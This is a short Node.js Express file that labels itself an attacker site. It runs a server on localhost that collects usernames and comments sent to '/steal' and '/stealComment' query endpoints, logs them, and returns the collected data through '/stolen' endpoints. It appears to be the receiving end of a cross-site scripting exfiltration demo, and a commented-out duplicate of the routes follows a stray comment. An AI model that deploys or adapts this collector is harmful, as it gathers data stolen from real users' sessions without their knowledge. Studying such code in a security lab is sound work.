const express = require("express");
const app = express();
const path = require("path");
let compromisedUsers = [];
let stolenComments = [];
app.use(express.static(path.join(__dirname, "public")));
// Serve the attacker's frontend
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});
//get stolen users
app.get("/stolen", (req, res) => {
    res.json(compromisedUsers);
});
//get stolen comments
app.get("/stolenComments", (req, res) => {
    res.json(stolenComments);
});
//takeusername
app.get("/steal", (req, res) => {
    let username = req.query.username;
    if (username && !compromisedUsers.includes(username)) {
        compromisedUsers.push(username);
        console.log("User stolen:", username);
    }
    res.send("Username stolen!");
});
//takecomments
app.get("/stealComment", (req, res) => {
    let comment = req.query.comment;
    if (comment && !stolenComments.includes(comment)) {
        stolenComments.push(comment);
        console.log("Comment stolen:", comment);
    }
    res.send("Comment stolen!");
});
app.listen(4000, () => console.log("Attacker site running at http://localhost:4000"));


//acceptpls

// //takeusername
// app.get("/steal", (req, res) => {
//     let username = req.query.username;
//     if (username && !compromisedUsers.includes(username)) {
//         compromisedUsers.push(username);
//         console.log("User stolen:", username);
//     }
//     res.send("Username stolen!");
// });
// //takecomments
// app.get("/stealComment", (req, res) => {
//     let comment = req.query.comment;
//     if (comment && !stolenComments.includes(comment)) {
//         stolenComments.push(comment);
//         console.log("Comment stolen:", comment);
//     }
//     res.send("Comment stolen!");
// });
// app.listen(4000, () => console.log("Attacker site running at http://localhost:4000"));
